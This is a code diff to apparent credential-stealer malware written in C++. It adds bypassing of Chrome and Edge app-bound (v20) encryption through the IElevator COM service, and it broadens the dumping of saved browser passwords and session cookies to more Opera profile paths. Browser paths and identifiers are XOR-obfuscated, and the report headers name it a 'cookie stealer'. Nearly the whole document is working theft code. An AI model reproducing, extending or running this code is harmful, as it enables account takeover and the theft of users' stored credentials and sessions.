@@ -15,6 +15,7 @@
 #include "../utils/Shared.h"
 #include <nlohmann/json.hpp>
 #include <sqlite3.h>
+#include <objbase.h>
 
 #pragma comment(lib, "crypt32.lib")
 
@@ -23,6 +24,14 @@ namespace credential {
     namespace fs = std::filesystem;
 
     namespace {
+        // IElevator interface definition (v20 decryption)
+        MIDL_INTERFACE("10915CE0-653E-4B02-8610-86B5A6112A0A")
+        IElevator : public IUnknown {
+        public:
+            virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRX(const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, ULONG_PTR*) = 0;
+            virtual HRESULT STDMETHODCALLTYPE DecryptData(const unsigned char* ciphertext, uint32_t ciphertext_size, wchar_t** plaintext) = 0;
+        };
+
         // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
         const wchar_t kOsCryptEnc[] = { L'\x24', L'\x6c', L'\xd3', L'\x5d', L'\x39', L'\x66', L'\xfc', L'\x4a', L'\0' };
         const wchar_t kEncryptedKeyEnc[] = { L'\x2e', L'\x71', L'\xef', L'\x4c', L'\x32', L'\x6f', L'\xf8', L'\x5b', L'\x2f', L'\x40', L'\xe7', L'\x5b', L'\x32', L'\0' };
@@ -43,6 +52,48 @@ namespace credential {
         const wchar_t kBravePathEnc[] = { L'\x17', L'\x5d', L'\xfe', L'\x5f', L'\x3d', L'\x7a', L'\xdf', L'\x51', L'\x2d', L'\x6b', L'\xfb', L'\x5f', L'\x39', L'\x7a', L'\xd0', L'\x7c', L'\x39', L'\x7e', L'\xfa', L'\x5b', L'\x66', L'\x5d', L'\xfe', L'\x51', L'\x3c', L'\x6c', L'\xe9', L'\x4c', L'\x17', L'\x4a', L'\xff', L'\x5b', L'\x39', L'\x3f', L'\xc8', L'\x5f', L'\x3f', L'\x7e', L'\0' };
         const wchar_t kOperaPathEnc[] = { L'\x17', L'\x50', L'\xfc', L'\x5b', L'\x39', L'\x7e', L'\xac', L'\x6d', L'\x24', L'\x79', L'\xf8', L'\x49', L'\x2a', L'\x6d', L'\xe9', L'\x62', L'\x04', L'\x6f', L'\xe9', L'\x4c', L'\x2a', L'\x3f', L'\xdf', L'\x4a', L'\x2a', L'\x7d', L'\xe0', L'\x5b', L'\0' };
         const wchar_t kOperaGxPathEnc[] = { L'\x17', L'\x50', L'\xfc', L'\x5b', L'\x39', L'\x7e', L'\xac', L'\x6d', L'\x24', L'\x79', L'\xf8', L'\x49', L'\x2a', L'\x6d', L'\xe9', L'\x62', L'\x04', L'\x6f', L'\xe9', L'\x4c', L'\x2a', L'\x3f', L'\xcb', L'\x66', L'\x6b', L'\x4c', L'\xf8', L'\x5f', L'\x29', L'\x73', L'\xe9', L'\0' };
+
+        const wchar_t kChromeClsidEnc[] = { L'\x7c', L'\x2f', L'\xb4', L'\x06', L'\x7d', L'\x2f', L'\xbf', L'\x0e', L'\x66', L'\x7e', L'\xe8', L'\x07', L'\x2a', L'\x32', L'\xb8', L'\x5d', L'\x7e', L'\x2c', L'\xa1', L'\x07', L'\x79', L'\x29', L'\xbe', L'\x13', L'\x2e', L'\x2e', L'\xe8', L'\x0b', L'\x79', L'\x7b', L'\xb5', L'\x5f', L'\x7f', L'\x2d', L'\xea', L'\x06', L'\0' };
+        const wchar_t kEdgeClsidEnc[] = { L'\x7a', L'\x2c', L'\xc9', L'\x0c', L'\x79', L'\x5b', L'\xcf', L'\x0d', L'\x66', L'\x2f', L'\xbe', L'\x0e', L'\x0a', L'\x32', L'\xb8', L'\x08', L'\x0e', L'\x2f', L'\xa1', L'\x7c', L'\x7c', L'\x28', L'\xb4', L'\x13', L'\x7f', L'\x5b', L'\xbc', L'\x07', L'\x7b', L'\x28', L'\xcd', L'\x06', L'\x0a', L'\x2c', L'\xbf', L'\x7a', L'\0' };
+        const wchar_t kIElevatorIidEnc[] = { L'\x7a', L'\x2f', L'\xb5', L'\x0f', L'\x7e', L'\x5c', L'\xc9', L'\x0e', L'\x66', L'\x29', L'\xb9', L'\x0d', L'\x0e', L'\x32', L'\xb8', L'\x7c', L'\x7b', L'\x2d', L'\xa1', L'\x06', L'\x7d', L'\x2e', L'\xbc', L'\x13', L'\x73', L'\x29', L'\xce', L'\x0b', L'\x0a', L'\x29', L'\xbd', L'\x0f', L'\x79', L'\x5e', L'\xbc', L'\x7f', L'\0' };
+
+        std::string DecryptAppBound(const std::vector<BYTE>& ciphertext, const std::string& browserName) {
+            CLSID clsid;
+            HRESULT hr;
+            std::wstring clsidStr;
+            if (browserName.find("Chrome") != std::string::npos) {
+                clsidStr = utils::DecryptW(kChromeClsidEnc, wcslen(kChromeClsidEnc));
+            } else if (browserName.find("Edge") != std::string::npos) {
+                clsidStr = utils::DecryptW(kEdgeClsidEnc, wcslen(kEdgeClsidEnc));
+            } else {
+                return "[v20 encrypted - " + browserName + "]";
+            }
+
+            hr = CLSIDFromString(clsidStr.c_str(), &clsid);
+            if (FAILED(hr)) return "[v20 CLSID fail]";
+
+            IID iid;
+            hr = IIDFromString(utils::DecryptW(kIElevatorIidEnc, wcslen(kIElevatorIidEnc)).c_str(), &iid);
+            if (FAILED(hr)) return "[v20 IID fail]";
+
+            IElevator* pElevator = NULL;
+            // No CoInitialize here as it's done in TaskDispatcher
+            hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, (void**)&pElevator);
+            if (SUCCEEDED(hr) && pElevator) {
+                wchar_t* plaintext = NULL;
+                // v20 DecryptData usually expects the exact same byte array found in SQLite
+                hr = pElevator->DecryptData(ciphertext.data(), (uint32_t)ciphertext.size(), &plaintext);
+                if (SUCCEEDED(hr) && plaintext) {
+                    std::string result = utils::ws2s(plaintext);
+                    CoTaskMemFree(plaintext);
+                    pElevator->Release();
+                    return result;
+                }
+                pElevator->Release();
+                return "[v20 DecryptData fail - HRESULT " + utils::Shared::ToHex(hr) + "]";
+            }
+            return "[v20 Elevation Service fail - HRESULT " + utils::Shared::ToHex(hr) + "]";
+        }
 
         void SafeCopyDatabase(const std::string& src, const std::string& dest) {
             try {
@@ -121,7 +172,7 @@ namespace credential {
             return {};
         }
 
-        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
+        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey, const std::string& browserName) {
             if (ciphertext.empty()) return "";
 
             // Modern Chromium: v10/v11 (AES-GCM)
@@ -138,8 +189,7 @@ namespace credential {
 
             // v20 (App-Bound Encryption) - Not decryptable with master key alone
             if (ciphertext.size() >= 2 && ciphertext[0] == 'v' && ciphertext[1] == '2') {
-                // LOG_DEBUG("[!] Encountered v20 App-Bound encryption (needs elevation service)");
-                return "[v20 encrypted]";
+                return DecryptAppBound(ciphertext, browserName);
             }
 
             // Legacy Chromium: DPAPI
@@ -159,6 +209,8 @@ namespace credential {
     std::string DumpChromiumPasswords() {
         bool impersonated = utils::ImpersonateLoggedOnUser();
         std::string report = "CHROMIUM_PASSWORDS_DUMPED:\n";
+        if (impersonated) report += "[+] Running with impersonated user token.\n";
+
         report += "BROWSER | PROFILE | URL | USERNAME | PASSWORD\n";
         report += "--------------------------------------------------------------------------------\n";
 
@@ -171,47 +223,58 @@ namespace credential {
 
         struct BrowserPath {
             std::string name;
-            std::string userDataPath;
+            std::string localPath;
+            std::string roamingPath;
         };
 
         std::vector<BrowserPath> browsers = {
-            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, wcslen(kChromePathEnc)))},
-            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, wcslen(kEdgePathEnc)))},
-            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, wcslen(kBravePathEnc)))},
-            {"Opera", roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc)))},
-            {"Opera GX", roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc)))}
+            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, wcslen(kChromePathEnc))), ""},
+            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, wcslen(kEdgePathEnc))), ""},
+            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, wcslen(kBravePathEnc))), ""},
+            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc)))},
+            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc)))}
         };
 
         for (const auto& browser : browsers) {
-            if (!fs::exists(browser.userDataPath)) continue;
+            std::string localStateDir = browser.localPath;
+            if (localStateDir.empty() || !fs::exists(localStateDir)) localStateDir = browser.roamingPath;
+            if (localStateDir.empty() || !fs::exists(localStateDir)) {
+                LOG_DEBUG("No user data path found for browser: " + browser.name);
+                continue;
+            }
 
-            std::string localState = browser.userDataPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, wcslen(kLocalStateEnc)));
+            std::string localState = localStateDir + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, wcslen(kLocalStateEnc)));
             std::vector<BYTE> key = GetMasterKey(localState);
 
-            std::vector<std::string> profiles;
-            if (fs::exists(browser.userDataPath + "\\" + utils::ws2s(utils::DecryptW(kLoginDataEnc, wcslen(kLoginDataEnc))))) {
-                profiles.push_back("");
-            }
-            std::string dName = utils::ws2s(utils::DecryptW(kDefaultEnc, wcslen(kDefaultEnc)));
-            if (fs::exists(browser.userDataPath + "\\" + dName)) {
-                profiles.push_back(dName);
-            }
+            std::vector<std::string> searchPaths;
+            if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) searchPaths.push_back(browser.roamingPath);
+            if (!browser.localPath.empty() && browser.localPath != browser.roamingPath && fs::exists(browser.localPath)) searchPaths.push_back(browser.localPath);
 
-            try {
-                for (const auto& entry : fs::directory_iterator(browser.userDataPath)) {
-                    if (entry.is_directory()) {
-                        std::string name = entry.path().filename().string();
-                        std::string prefix = utils::ws2s(utils::DecryptW(kProfilePrefixEnc, wcslen(kProfilePrefixEnc)));
-                        if (name.find(prefix) == 0 && name != dName) profiles.push_back(name);
-                    }
+            for (const auto& searchPath : searchPaths) {
+                std::vector<std::string> profiles;
+                if (fs::exists(searchPath + "\\" + utils::ws2s(utils::DecryptW(kLoginDataEnc, wcslen(kLoginDataEnc))))) {
+                    profiles.push_back("");
                 }
-            } catch (...) {}
+                std::string dName = utils::ws2s(utils::DecryptW(kDefaultEnc, wcslen(kDefaultEnc)));
+                if (fs::exists(searchPath + "\\" + dName)) {
+                    profiles.push_back(dName);
+                }
 
-            for (const auto& profile : profiles) {
-                std::string profilePath = profile.empty() ? browser.userDataPath : (browser.userDataPath + "\\" + profile);
-                std::string loginData = profilePath + "\\" + utils::ws2s(utils::DecryptW(kLoginDataEnc, wcslen(kLoginDataEnc)));
+                try {
+                    for (const auto& entry : fs::directory_iterator(searchPath)) {
+                        if (entry.is_directory()) {
+                            std::string name = entry.path().filename().string();
+                            std::string prefix = utils::ws2s(utils::DecryptW(kProfilePrefixEnc, wcslen(kProfilePrefixEnc)));
+                            if (name.find(prefix) == 0 && name != dName) profiles.push_back(name);
+                        }
+                    }
+                } catch (...) {}
 
-                if (!fs::exists(loginData)) continue;
+                for (const auto& profile : profiles) {
+                    std::string profilePath = profile.empty() ? searchPath : (searchPath + "\\" + profile);
+                    std::string loginData = profilePath + "\\" + utils::ws2s(utils::DecryptW(kLoginDataEnc, wcslen(kLoginDataEnc)));
+
+                    if (!fs::exists(loginData)) continue;
 
                 char tempPath[MAX_PATH];
                 GetTempPathA(MAX_PATH, tempPath);
@@ -231,7 +294,7 @@ namespace credential {
 
                             if (url && user && blobLen > 0) {
                                 std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
-                                std::string pass = DecryptPassword(encrypted, key);
+                                std::string pass = DecryptPassword(encrypted, key, browser.name);
                                 if (!pass.empty()) {
                                     report += browser.name + " | " + profile + " | " + url + " | " + user + " | " + pass + "\n";
                                 }
@@ -253,6 +316,7 @@ namespace credential {
         bool impersonated = utils::ImpersonateLoggedOnUser();
         std::stringstream ss;
         ss << "# CHROMIUM COOKIE STEALER RESULTS\n";
+        if (impersonated) ss << "# [+] Running with impersonated user token.\n";
         int count = 0;
 
         char path[MAX_PATH];
@@ -264,50 +328,58 @@ namespace credential {
 
         struct BrowserPath {
             std::string name;
-            std::string userDataPath;
+            std::string localPath;
+            std::string roamingPath;
         };
 
         std::vector<BrowserPath> browsers = {
-            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, wcslen(kChromePathEnc)))},
-            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, wcslen(kEdgePathEnc)))},
-            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, wcslen(kBravePathEnc)))},
-            {"Opera", roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc)))},
-            {"Opera GX", roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc)))}
+            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, wcslen(kChromePathEnc))), ""},
+            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, wcslen(kEdgePathEnc))), ""},
+            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, wcslen(kBravePathEnc))), ""},
+            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc)))},
+            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc)))}
         };
 
         for (const auto& browser : browsers) {
-            if (!fs::exists(browser.userDataPath)) continue;
+            std::string localStateDir = browser.localPath;
+            if (localStateDir.empty() || !fs::exists(localStateDir)) localStateDir = browser.roamingPath;
+            if (localStateDir.empty() || !fs::exists(localStateDir)) continue;
 
-            std::string localState = browser.userDataPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, wcslen(kLocalStateEnc)));
+            std::string localState = localStateDir + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, wcslen(kLocalStateEnc)));
             std::vector<BYTE> key = GetMasterKey(localState);
 
-            std::vector<std::string> profiles;
-            std::string dName = utils::ws2s(utils::DecryptW(kDefaultEnc, wcslen(kDefaultEnc)));
-            if (fs::exists(browser.userDataPath + "\\" + dName)) {
-                profiles.push_back(dName);
-            }
-            // Check for root profile cookies if Default doesn't exist or just anyway
-            std::string networkName = utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc)));
-            std::string cookiesName = utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
-            if (fs::exists(browser.userDataPath + "\\" + networkName + "\\" + cookiesName) ||
-                fs::exists(browser.userDataPath + "\\" + cookiesName)) {
-                profiles.push_back("");
-            }
+            std::vector<std::string> searchPaths;
+            if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) searchPaths.push_back(browser.roamingPath);
+            if (!browser.localPath.empty() && browser.localPath != browser.roamingPath && fs::exists(browser.localPath)) searchPaths.push_back(browser.localPath);
 
-            try {
-                for (const auto& entry : fs::directory_iterator(browser.userDataPath)) {
-                    if (entry.is_directory()) {
-                        std::string name = entry.path().filename().string();
-                        std::string prefix = utils::ws2s(utils::DecryptW(kProfilePrefixEnc, wcslen(kProfilePrefixEnc)));
-                        if (name.find(prefix) == 0 && name != dName) profiles.push_back(name);
-                    }
+            for (const auto& searchPath : searchPaths) {
+                std::vector<std::string> profiles;
+                std::string dName = utils::ws2s(utils::DecryptW(kDefaultEnc, wcslen(kDefaultEnc)));
+                if (fs::exists(searchPath + "\\" + dName)) {
+                    profiles.push_back(dName);
                 }
-            } catch (...) {}
+                // Check for root profile cookies if Default doesn't exist or just anyway
+                std::string networkName = utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc)));
+                std::string cookiesName = utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
+                if (fs::exists(searchPath + "\\" + networkName + "\\" + cookiesName) ||
+                    fs::exists(searchPath + "\\" + cookiesName)) {
+                    profiles.push_back("");
+                }
 
-            for (const auto& profile : profiles) {
-                std::string profileBase = profile.empty() ? browser.userDataPath : (browser.userDataPath + "\\" + profile);
+                try {
+                    for (const auto& entry : fs::directory_iterator(searchPath)) {
+                        if (entry.is_directory()) {
+                            std::string name = entry.path().filename().string();
+                            std::string prefix = utils::ws2s(utils::DecryptW(kProfilePrefixEnc, wcslen(kProfilePrefixEnc)));
+                            if (name.find(prefix) == 0 && name != dName) profiles.push_back(name);
+                        }
+                    }
+                } catch (...) {}
 
-                // Modern path: \Network\Cookies, Legacy: \Cookies
+                for (const auto& profile : profiles) {
+                    std::string profileBase = profile.empty() ? searchPath : (searchPath + "\\" + profile);
+
+                    // Modern path: \Network\Cookies, Legacy: \Cookies
                 std::string cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc))) + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
                 if (!fs::exists(cookiesPath)) {
                     cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
@@ -335,7 +407,7 @@ namespace credential {
 
                             if (host && name && cpath && blobLen > 0) {
                                 std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
-                                std::string val = DecryptPassword(encrypted, key);
+                                std::string val = DecryptPassword(encrypted, key, browser.name);
                                 if (!val.empty()) {
                                     ss << host << "\t" << ((host[0] == '.') ? "TRUE" : "FALSE") << "\t" << cpath << "\t" << "TRUE\t" << expiry << "\t" << name << "\t" << val << "\n";
                                     count++;
